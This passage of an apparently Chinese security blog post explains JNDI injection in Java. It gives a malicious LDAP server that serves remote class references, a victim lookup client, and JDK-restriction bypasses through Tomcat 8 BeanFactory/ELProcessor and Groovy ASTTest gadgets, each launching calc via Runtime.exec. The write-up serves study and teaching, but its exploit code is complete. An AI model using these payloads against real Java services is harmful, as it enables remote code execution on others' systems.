+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>创建一个ldap服务器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI_ldap;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_server</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:9000/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建受害的服务端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI_ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/test&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功执行</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=YWJmMDVhNjcwYmVjODU3ZmY5YTI1MWNmMThhZTBkYThfWXJqN25CbnBjZHVRS0RJcE4zYUM0UHZUTWpFcDFxeFhfVG9rZW46SmtMcmJoUnFwb0pMdU54SnltT2NQWnJabnNiXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<h3 id="高版本jdk绕过-tomcat8环境"><a href="#高版本jdk绕过-tomcat8环境" class="headerlink" title="高版本jdk绕过(tomcat8环境)"></a>高版本jdk绕过(tomcat8环境)</h3><h4 id="补丁的形式"><a href="#补丁的形式" class="headerlink" title="补丁的形式"></a>补丁的形式</h4><p>高版本的补丁形式,一般在执行远程的代码时会进行检查，这里主要体现在RegistryContext的decodeObject方法里面，这里会增加一个属性trustURLCodebase来进行判断</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=MzRhMzc2ODgxOTJjNzdiOTQ3NDAwMjhiYWZjOTExN2NfWjNGb09sYnFubUkyNmU0dWhFWjJZdHFHS05wbnhXamhfVG9rZW46VnFJU2JyaEk4b29HS2Z4amMwT2N5SlY4bnplXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>绕过直接运行就会出现</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NTcyYTY2YzQ3MmEzOTJkNWRiNzYwNGRiM2IxMzg0YzNfckhJUDNGcjZiTUE0Vm91SmhhU2k1NzliN3BGRDRaYjVfVG9rZW46VU44OGJxcEYzb25mNmN4cDdrNWM3MVdyblRlXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>这里可以看到它的默认值为false，如果要远程加载就需要通过手动将它的值进行修改为true</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFiOGE4M2Q2OGVhMzNjZTBiYjQ1YjVhZjMwMTAwOGNfQmdpeDR5M0tjQUxHd3NQN0xtb2tveFdTeFpaZ3o2TFBfVG9rZW46QWhISGJISXZhb3BBUU14RkJxMWNIa3psblFjXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="tomcat8"><a href="#tomcat8" class="headerlink" title="tomcat8"></a>tomcat8</h5><p>在jdk1.8 141到jdk1.8 191之间对rmi增加了上述补丁，但是ldap没有，还是可以用</p>
+<p>但是在jdk1.8 191之后就不支持远程对象加载了，但是我们还是可以通过让它来绑定本地的类来达到命令执行的效果，但是这个显然也是需要有一定条件的，原生jdk里面就比较难实现</p>
+<p>现在其实加载引用是可以实现，但是无法远程获取工厂，所以就是看有没有依赖的类中存在一个原生的工厂导致可以被利用</p>
+<p>主要看实现ObjectFactory接口的类，里面是否满足，通过调用其getObjectInstance来实现命令执行</p>
+<p>导入tomcat8依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>这里就需要有tomcat8的依赖，它的依赖里面就存在一个类BeanFactory满足，tomcat其它版本都会有所改变所以可能不行</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NGJhYmViM2FhZDE0N2FmMTBiZGM5ZGQ5MGUxNDdlODNfSEpMRXhPeWg4M2xIT0xvTHNIRHVhc25Eakoza0FsUU5fVG9rZW46QWxlUmI2QklsbzRDb0h4VW9LMGNJZ3BabmdoXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>这里看一下为什么它可以被利用，它的getObjectInstance方法里面调用了invoke来反射调用类的方法，具体就可以不用太看，因为有点长，主要看看如何利用</p>
+<p>首先到达BeanFactory的getObjectInstance方法，里面先是加载了ELProcessor类</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=OTVkYWY1NWFhYjU3YTIwMTdjZGZiODM5YmU3YTllNmVfeGVVMXdpSW1SeFBGcDVCWFU5OVc3RFpXRDJvR0l4QVpfVG9rZW46VXJub2J5RVpEb2hxWjd4NzBCOWMySGVWbnJmXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>这里再进行初始化操作</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTc4YjBiZDZlNzY3OGNjOTRmYmEzZTM1MTlhZjJmZDJfWVp1UUVLZDU3Y2p6Q0lFQ3hNMkxIUTZzU043cDNaN0FfVG9rZW46V1BJemJlell2b3BkbHJ4M0s2YWNIaXIxbm1lXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>最终跟进invoke方法</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=YmY0MmZjNjBmZDljMDlhY2M1MjI1NWE4MDIxN2MzYjdfbEs4QzRPSE42NGZ2bUsyS0hzZzBUOGVVWW9WT0hNYkxfVG9rZW46V0tWY2J4TXhtb0ZIMmF4a2ttVWNwUHZUbndIXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>跟进到了ELProcessor里面，这里再执行危险函数</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=M2EzMDg4ODJlMzcwYWQ2ZDQwNzYyZjU2NDA0N2EyNTdfb0hCNU04RWJaeFhXZHVyVjFqWUZWVVFmRXgyY2tlOUxfVG9rZW46SFNsV2I3aEdEb005bkp4MkxuSGNwclF4bmRkXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>server</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>,resourceRef);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Client</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU1OWIyZjhjYzg2YjgwNjhlMTlkZTJlNjZlOWJiZjFfMU0xeEt4cFFBU0tFQlV6clg0bE9WVWZ3aEk2RmpMR2NfVG9rZW46SVVxeWJrSTA2b0VsR2F4UnBsR2NvSWI2bm1oXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<h5 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h5><p>这里在利用tomcat8的依赖下BeanFactory通过ELProcessor被利用外，还可以通过Groovy来实现命令执行</p>
+<p>依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;groovy&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.4</span><span class="number">.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>Poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Server_Bypass_Groovy</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=parseClass&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>,script));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;luokuang&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行成功</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=MTEwODIwMDAyMWMyOGY2ZWJmNWVkMmU0ODY0ZTRlZjlfQ1Fsd3JnajhmUHFBUzJaOUJVTDJZY2JsVTVRa2xxTldfVG9rZW46UzJYdWJENE96b2tkdFF4S1dMemNiNjFmbjNyXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/12/18/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="RMI反序列化">
+                  <i class="fa fa-angle-left"></i> RMI反序列化
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/02/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="ROME反序列化">
+                  ROME反序列化 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">luokuang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
